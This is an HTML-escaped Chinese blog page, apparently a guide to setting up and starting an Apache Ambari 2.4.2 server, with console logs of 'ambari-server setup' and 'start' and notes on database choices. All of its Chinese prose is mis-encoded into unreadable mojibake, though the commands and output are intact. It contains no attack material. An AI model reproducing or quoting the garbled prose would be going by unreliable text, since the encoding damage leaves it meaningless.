&lt;h3 id=&quot;2-è®¾ç½®AmbariæœåŠ¡å™¨&quot;&gt;&lt;a href=&quot;#2-è®¾ç½®AmbariæœåŠ¡å™¨&quot; class=&quot;headerlink&quot; title=&quot;2.è®¾ç½®AmbariæœåŠ¡å™¨&quot;&gt;&lt;/a&gt;2.è®¾ç½®AmbariæœåŠ¡å™¨&lt;/h3&gt;&lt;p&gt;åœ¨å¯åŠ¨&lt;code&gt;Ambari&lt;/code&gt;æœåŠ¡å™¨ä¹‹å‰ï¼Œå¿…é¡»è®¾ç½®AmbariæœåŠ¡å™¨ã€‚å®‰è£…ç¨‹åºå°†Ambarié…ç½®ä¸ºä¸Ambariæ•°æ®åº“é€šä¿¡ï¼Œå®‰è£…JDKå¹¶å…è®¸æ‚¨è‡ªå®šä¹‰Ambari Serverå®ˆæŠ¤ç¨‹åºå°†ä½œä¸ºè¿è¡Œçš„ç”¨æˆ·å¸æˆ·ã€‚è¯¥ &lt;code&gt;ambari-server setup&lt;/code&gt;å‘½ä»¤ç®¡ç†è®¾ç½®è¿‡ç¨‹ã€‚åœ¨AmbariæœåŠ¡å™¨ä¸»æœºä¸Šè¿è¡Œä»¥ä¸‹å‘½ä»¤ä»¥å¼€å§‹è®¾ç½®è¿‡ç¨‹ã€‚æ‚¨è¿˜å¯ä»¥å°†â€œ è®¾ç½®é€‰é¡¹â€é™„åŠ åˆ°å‘½ä»¤ã€‚&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;å¯åŠ¨æœåŠ¡&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;15&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;16&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;17&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;18&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;19&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;20&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;21&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;22&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;23&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;24&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;25&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;26&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;27&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;28&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;29&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;30&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;31&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;32&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;33&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;34&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;35&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;36&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;37&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;38&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;39&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;40&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;41&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;42&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;43&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;44&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;45&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;46&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;47&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;48&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;49&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;50&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;51&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;52&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;53&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;54&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;55&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;56&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;57&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;58&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;59&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;60&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;61&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;62&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;ambari-server setup&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;###è¿™é‡Œç”±äºä¸‹è½½jdk1.8å¤ªæ…¢é€Ÿåº¦è¿‡æ…¢ã€‚æˆ‘æå‰æŠŠjdkä¸‹è½½ä¸‹æ¥æ”¾åˆ°äº†/srv/jdk1.8.0_66 ç›®å½•&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;[root@ambari-server_01 ~]&lt;span class=&quot;comment&quot;&gt;# ambari-server setup&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Using python  /usr/bin/python&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Setup ambari-server&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Checking SELinux...&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;SELinux status is &lt;span class=&quot;string&quot;&gt;&#39;enabled&#39;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;SELinux mode is &lt;span class=&quot;string&quot;&gt;&#39;permissive&#39;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;WARNING: SELinux is &lt;span class=&quot;built_in&quot;&gt;set&lt;/span&gt; to &lt;span class=&quot;string&quot;&gt;&#39;permissive&#39;&lt;/span&gt; mode and temporarily disabled.&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;OK to &lt;span class=&quot;built_in&quot;&gt;continue&lt;/span&gt; [y/n] (y)? y&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Customize user account &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; ambari-server daemon [y/n] (n)? y&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Enter user account &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; ambari-server daemon (root):&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Adjusting ambari-server permissions and ownership...&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Checking firewall status...&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Checking JDK...&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;[1] Oracle JDK 1.8 + Java Cryptography Extension (JCE) Policy Files 8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;[2] Oracle JDK 1.7 + Java Cryptography Extension (JCE) Policy Files 7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;[3] Custom JDK&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;==============================================================================&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Enter choice (1): 3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;WARNING: JDK must be installed on all hosts and JAVA_HOME must be valid on all hosts.&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;WARNING: JCE Policy files are required &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; configuring Kerberos security. If you plan to use Kerberos,please make sure JCE Unlimited Strength Jurisdiction Policy Files are valid on all hosts.&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Path to JAVA_HOME: /srv/jdk1.8.0_66&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Validating JDK on Ambari Server...done.&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Completing setup...&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Configuring database...&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Enter advanced database configuration [y/n] (n)? y&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Configuring database...&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;==============================================================================&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Choose one of the following options:&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;[1] - PostgreSQL (Embedded)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;[2] - Oracle&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;[3] - MySQL / MariaDB&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;[4] - PostgreSQL&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;[5] - Microsoft SQL Server (Tech Preview)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;[6] - SQL Anywhere&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;[7] - BDB&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;==============================================================================&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Enter choice (1):3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Database name (ambari):&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Postgres schema (ambari):&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Username (ambari):&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Enter Database Password (bigdata):&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Default properties detected. Using built-in database.&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Configuring ambari database...&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Checking PostgreSQL...&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Running initdb: This may take up to a minute.&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;æ­£åœ¨åˆå§‹åŒ–æ•°æ®åº“ï¼š[ç¡®å®š]&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;About to start PostgreSQL&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Configuring &lt;span class=&quot;built_in&quot;&gt;local&lt;/span&gt; database...&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Connecting to &lt;span class=&quot;built_in&quot;&gt;local&lt;/span&gt; database...done.&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Configuring PostgreSQL...&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Restarting PostgreSQL&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Extracting system views...&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;ambari-admin-2.4.2.0.136.jar&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;............&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Adjusting ambari-server permissions and ownership...&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Ambari Server &lt;span class=&quot;string&quot;&gt;&#39;setup&#39;&lt;/span&gt; completed successfully.&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;You have mail &lt;span class=&quot;keyword&quot;&gt;in&lt;/span&gt; /var/spool/mail/root&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h5 id=&quot;2-1-å“åº”å®‰è£…æç¤ºï¼š&quot;&gt;&lt;a href=&quot;#2-1-å“åº”å®‰è£…æç¤ºï¼š&quot; class=&quot;headerlink&quot; title=&quot;2.1 å“åº”å®‰è£…æç¤ºï¼š&quot;&gt;&lt;/a&gt;2.1 å“åº”å®‰è£…æç¤ºï¼š&lt;/h5&gt;&lt;p&gt;å¦‚æœæ‚¨æ²¡æœ‰æš‚æ—¶ç¦ç”¨&lt;code&gt;SELinux&lt;/code&gt;ï¼Œæ‚¨å¯èƒ½ä¼šæ”¶åˆ°è­¦å‘Šã€‚æ¥å—é»˜è®¤å€¼&lt;code&gt;ï¼ˆyï¼‰&lt;/code&gt;ï¼Œç„¶åç»§ç»­ã€‚&lt;/p&gt;
&lt;p&gt;é»˜è®¤æƒ…å†µä¸‹ï¼ŒAmbariæœåŠ¡å™¨è¿è¡Œåœ¨&lt;code&gt;root&lt;/code&gt;ã€‚åœ¨&lt;code&gt;Customize user account for ambari-server daemon&lt;/code&gt;æç¤ºç¬¦å¤„æ¥å—é»˜è®¤&lt;code&gt;ï¼ˆnï¼‰&lt;/code&gt;ï¼Œä»¥ç»§ç»­rootã€‚&lt;/p&gt;
&lt;p&gt;å¦‚æœè¦åˆ›å»ºå…¶ä»–ç”¨æˆ·ä»¥è¿è¡Œ&lt;code&gt;Ambari&lt;/code&gt;æœåŠ¡å™¨æˆ–åˆ†é…ä»¥å‰åˆ›å»ºçš„ç”¨æˆ·ï¼Œè¯·&lt;code&gt;y&lt;/code&gt;åœ¨ &lt;code&gt;Customize user account for ambari-server daemon&lt;/code&gt;æç¤ºç¬¦å¤„é€‰æ‹©ï¼Œç„¶åæä¾›ç”¨æˆ·åã€‚&lt;br&gt;æœ‰å…³ä»¥érootç”¨æˆ·èº«ä»½è¿è¡ŒAmbariæœåŠ¡å™¨çš„æ›´å¤šä¿¡æ¯ï¼Œè¯·å‚é˜…Hortonworksæ•°æ®å¹³å°Apache Ambariå‚è€ƒ&amp;gt; &lt;a href=&quot;http://docs.hortonworks.com/HDPDocuments/Ambari-2.4.2.0/bk_ambari-security/content/configuring_ambari_for_non-root.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;ä¸ºéæ ¹ç”¨æˆ·é…ç½®Ambari&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;å¦‚æœæ‚¨æ²¡æœ‰æš‚æ—¶åœç”¨&lt;code&gt;iptables&lt;/code&gt;ï¼Œå¯èƒ½ä¼šæ”¶åˆ°è­¦å‘Šã€‚è¾“å…¥&lt;code&gt;y&lt;/code&gt;ä»¥ç»§ç»­ã€‚&lt;/p&gt;
&lt;p&gt;JDK&lt;br&gt;é€‰æ‹©è¦ä¸‹è½½çš„&lt;code&gt;JDK&lt;/code&gt;ç‰ˆæœ¬ã€‚è¾“å…¥&lt;code&gt;1&lt;/code&gt;ä»¥ä¸‹è½½&lt;code&gt;Oracle JDK 1.8&lt;/code&gt;ã€‚æˆ–è€…ï¼Œæ‚¨å¯ä»¥é€‰æ‹©è¾“å…¥&lt;code&gt;è‡ªå®šä¹‰JDK&lt;/code&gt;ã€‚å¦‚æœé€‰æ‹©â€œ&lt;code&gt;è‡ªå®šä¹‰JDK&lt;/code&gt;â€ï¼Œåˆ™å¿…é¡»åœ¨æ‰€æœ‰ä¸»æœºä¸Šæ‰‹åŠ¨å®‰è£…JDKå¹¶æŒ‡å®š&lt;code&gt;Java Home&lt;/code&gt;è·¯å¾„ã€‚&lt;/p&gt;
&lt;p&gt;â—ï¸â—ï¸ã€æ³¨æ„ã€‘&lt;/p&gt;
&lt;p&gt;JDKæ”¯æŒå®Œå…¨å–å†³äºæ‚¨é€‰æ‹©çš„&lt;code&gt;HDP Stack&lt;/code&gt;ç‰ˆæœ¬ã€‚è¯·å‚é˜…&lt;a href=&quot;http://docs.hortonworks.com/HDPDocuments/Ambari-2.4.2.0/bk_ambari-reference/content/ch_changing_the_jdk_version_on_an_existing_cluster.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Hortonworksæ•°æ®å¹³å°Apache Ambari&lt;/a&gt;å‚è€ƒä»¥æŸ¥çœ‹è¦å®‰è£…çš„HDP Stackç‰ˆæœ¬æ”¯æŒçš„JDKç‰ˆæœ¬ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼ŒAmbariæœåŠ¡å™¨è®¾ç½®ä¸‹è½½å¹¶å®‰è£…Oracle JDK 1.8å’Œéšé™„çš„Javaå¯†ç æœ¯æ‰©å±•ï¼ˆJCEï¼‰ç­–ç•¥æ–‡ä»¶ã€‚å¦‚æœè®¡åˆ’ä½¿ç”¨å…¶ä»–ç‰ˆæœ¬çš„JDKï¼Œè¯·å‚é˜… è®¾ç½®é€‰é¡¹ä»¥è·å–æ›´å¤šä¿¡æ¯ã€‚&lt;/p&gt;
&lt;p&gt;å‡ºç°æç¤ºæ—¶æ¥å—&lt;code&gt;Oracle JDK&lt;/code&gt;è®¸å¯è¯ã€‚æ‚¨å¿…é¡»æ¥å—æ­¤è®¸å¯è¯æ‰èƒ½ä»Oracleä¸‹è½½å¿…éœ€çš„JDKã€‚JDKåœ¨éƒ¨ç½²é˜¶æ®µå®‰è£…ã€‚&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;æ•°æ®åº“é€‰æ‹©ï¼š&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;é€‰æ‹©&lt;code&gt;n&lt;/code&gt;ä¸ºï¼Œ&lt;code&gt;Enter advanced database configuration&lt;/code&gt;ä»¥ä¾¿ä¸º&lt;code&gt;Ambari&lt;/code&gt;ä½¿ç”¨é»˜è®¤çš„åµŒå…¥å¼&lt;code&gt;PostgreSQL&lt;/code&gt;æ•°æ®åº“ã€‚é»˜è®¤çš„PostgreSQLæ•°æ®åº“åæ˜¯ambariã€‚é»˜è®¤ç”¨æˆ·åå’Œå¯†ç ä¸ºambari/bigdataã€‚å¦åˆ™ï¼Œè¦ä½¿ç”¨ç°æœ‰çš„PostgreSQLï¼ŒMySQL / MariaDBæˆ–Oracleæ•°æ®åº“ä¸Ambariï¼Œè¯·é€‰æ‹©yã€‚&lt;/p&gt;
&lt;p&gt;å¦‚æœä½¿ç”¨ç°æœ‰çš„PostgreSQLï¼ŒMySQL / MariaDBæˆ–Oracleæ•°æ®åº“å®ä¾‹ï¼Œè¯·ä½¿ç”¨ä»¥ä¸‹æç¤ºä¹‹ä¸€ï¼š&lt;/p&gt;
&lt;p&gt;â—ï¸â—ï¸[é‡è¦]&lt;br&gt;åœ¨è¿è¡Œå®‰è£…ç¨‹åºå’Œè¾“å…¥é«˜çº§æ•°æ®åº“é…ç½®ä¹‹å‰ï¼Œå¿…é¡»ä½¿ç”¨&lt;code&gt;â€œä½¿ç”¨éé»˜è®¤æ•°æ®åº“&lt;/code&gt;- Ambariâ€ä¸­è¯¦è¿°çš„æ­¥éª¤å‡†å¤‡éé»˜è®¤æ•°æ®åº“å®ä¾‹ã€‚&lt;/p&gt;
&lt;p&gt;â—ï¸â—ï¸[é‡è¦]&lt;/p&gt;
&lt;p&gt;ä¸æ”¯æŒä½¿ç”¨Microsoft SQL Serveræˆ–SQL Anywhereæ•°æ®åº“é€‰é¡¹ã€‚&lt;/p&gt;
&lt;p&gt;è¦ä½¿ç”¨ç°æœ‰çš„Oracleå®ä¾‹ï¼Œå¹¶ä¸ºè¯¥æ•°æ®åº“é€‰æ‹©è‡ªå·±çš„æ•°æ®åº“åç§°ï¼Œç”¨æˆ·åå’Œå¯†ç ï¼Œè¯·è¾“å…¥&lt;code&gt;2&lt;/code&gt;ã€‚&lt;br&gt;é€‰æ‹©è¦ä½¿ç”¨çš„æ•°æ®åº“ï¼Œå¹¶æä¾›åœ¨æç¤ºä¸­è¯·æ±‚çš„ä»»ä½•ä¿¡æ¯ï¼ŒåŒ…æ‹¬ä¸»æœºåï¼Œç«¯å£ï¼ŒæœåŠ¡åæˆ–SIDï¼Œç”¨æˆ·åå’Œå¯†ç ã€‚&lt;br&gt;è¦ä½¿ç”¨ç°æœ‰çš„MySQL / MariaDBæ•°æ®åº“ï¼Œå¹¶ä¸ºè¯¥æ•°æ®åº“é€‰æ‹©è‡ªå·±çš„æ•°æ®åº“åç§°ï¼Œç”¨æˆ·åå’Œå¯†ç ï¼Œè¯·è¾“å…¥3ã€‚&lt;br&gt;é€‰æ‹©è¦ä½¿ç”¨çš„æ•°æ®åº“ï¼Œå¹¶æä¾›åœ¨æç¤ºä¸­è¯·æ±‚çš„ä»»ä½•ä¿¡æ¯ï¼ŒåŒ…æ‹¬ä¸»æœºåï¼Œç«¯å£ï¼Œæ•°æ®åº“åç§°ï¼Œç”¨æˆ·åå’Œå¯†ç ã€‚&lt;br&gt;è¦ä½¿ç”¨ç°æœ‰çš„PostgreSQLæ•°æ®åº“ï¼Œå¹¶ä¸ºè¯¥æ•°æ®åº“é€‰æ‹©è‡ªå·±çš„æ•°æ®åº“åç§°ï¼Œç”¨æˆ·åå’Œå¯†ç ï¼Œè¯·è¾“å…¥4ã€‚&lt;br&gt;é€‰æ‹©è¦ä½¿ç”¨çš„æ•°æ®åº“ï¼Œå¹¶æä¾›åœ¨æç¤ºä¸­è¯·æ±‚çš„ä»»ä½•ä¿¡æ¯ï¼ŒåŒ…æ‹¬ä¸»æœºåï¼Œç«¯å£ï¼Œæ•°æ®åº“åç§°ï¼Œç”¨æˆ·åå’Œå¯†ç ã€‚&lt;br&gt;ç»§ç»­é…ç½®è¿œç¨‹æ•°æ®åº“è¿æ¥å±æ€§[y / n]é€‰æ‹©&lt;code&gt;y&lt;/code&gt;ã€‚&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;è¿™é‡Œæ•°æ®åº“ç”¨æˆ·åå’Œå¯†ç éƒ½æ˜¯é»˜è®¤å®‰è£…ï¼š&lt;/p&gt;
&lt;/blockquote&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;Database name (ambari)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Postgres schema (ambari)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Username (ambari)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Enter Database Password (bigdata)&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;blockquote&gt;
&lt;p&gt;è¿™é‡Œæˆ‘åšäº†ä¸€å±‚Nginxä»£ç†ï¼šå°†AmbariæœåŠ¡å™¨é…ç½®ä¸ºä½¿ç”¨æ­¤ä»£ç†æœåŠ¡å™¨&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&quot;3-å¯åŠ¨AmbariæœåŠ¡å™¨&quot;&gt;&lt;a href=&quot;#3-å¯åŠ¨AmbariæœåŠ¡å™¨&quot; class=&quot;headerlink&quot; title=&quot;3.å¯åŠ¨AmbariæœåŠ¡å™¨&quot;&gt;&lt;/a&gt;3.å¯åŠ¨AmbariæœåŠ¡å™¨&lt;/h3&gt;&lt;p&gt;åœ¨AmbariæœåŠ¡å™¨ä¸»æœºä¸Šè¿è¡Œä»¥ä¸‹å‘½ä»¤ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;ambari-server start
&lt;/code&gt;&lt;/pre&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;13&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;14&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;[root@ambari-server ~]&lt;span class=&quot;comment&quot;&gt;# ambari-server start&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Using python  /usr/bin/python&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Starting ambari-server&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Ambari Server running with administrator privileges.&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Organizing resource files at /var/lib/ambari-server/resources...&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Ambari database consistency check started...&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;No errors were found.&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Ambari database consistency check finished&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Server PID at: /var/run/ambari-server/ambari-server.pid&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Server out at: /var/&lt;span class=&quot;built_in&quot;&gt;log&lt;/span&gt;/ambari-server/ambari-server.out&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Server &lt;span class=&quot;built_in&quot;&gt;log&lt;/span&gt; at: /var/&lt;span class=&quot;built_in&quot;&gt;log&lt;/span&gt;/ambari-server/ambari-server.log&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Waiting &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; server start....................&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;Ambari Server &lt;span class=&quot;string&quot;&gt;&#39;start&#39;&lt;/span&gt; completed successfully.&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;You have mail &lt;span class=&quot;keyword&quot;&gt;in&lt;/span&gt; /var/spool/mail/root&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;è¦æ£€æŸ¥AmbariæœåŠ¡å™¨è¿›ç¨‹ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;ambari-server status
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;åœæ­¢AmbariæœåŠ¡å™¨ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;ambari-server stop
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;åœ¨AmbariæœåŠ¡å™¨å¯åŠ¨æ—¶ï¼Œ&lt;code&gt;Ambari&lt;/code&gt;è¿è¡Œæ•°æ®åº“ä¸€è‡´æ€§æ£€æŸ¥ï¼ŒæŸ¥æ‰¾é—®é¢˜ã€‚å¦‚æœå‘ç°ä»»ä½•é—®é¢˜ï¼ŒAmbariæœåŠ¡å™¨å¯åŠ¨å°†ä¸­æ­¢ï¼Œå¹¶ä¸”ä¸€æ¡æ¶ˆæ¯å°†æ‰“å°åˆ°æ§åˆ¶å°â€œæ•°æ®åº“é…ç½®ä¸€è‡´æ€§æ£€æŸ¥å¤±è´¥â€ã€‚æ›´å¤šè¯¦ç»†ä¿¡æ¯å°†å†™å…¥ä»¥ä¸‹æ—¥å¿—æ–‡â€‹â€‹ä»¶ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;/var/log/ambari-server/ambari-server-check-database.log
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;æ‚¨å¯ä»¥é€šè¿‡ä½¿ç”¨ä»¥ä¸‹é€‰é¡¹è·³è¿‡æ­¤æ£€æŸ¥æ¥å¼ºåˆ¶AmbariæœåŠ¡å™¨å¯åŠ¨ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;ambari-server start --skip-database-check
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;å¦‚æœå­˜åœ¨æ•°æ®åº“é—®é¢˜ï¼Œè¯·é€‰æ‹©è·³è¿‡æ­¤æ£€æŸ¥ï¼Œåœ¨æ›´æ­£æ•°æ®åº“ä¸€è‡´æ€§é—®é¢˜ä¹‹å‰ï¼Œä¸è¦å¯¹é›†ç¾¤æ‹“æ‰‘è¿›è¡Œä»»ä½•æ›´æ”¹æˆ–æ‰§è¡Œé›†ç¾¤å‡çº§ã€‚æœ€å¥½æŸ¥çœ‹å®˜ç½‘æ“ä½œã€‚&lt;/p&gt;
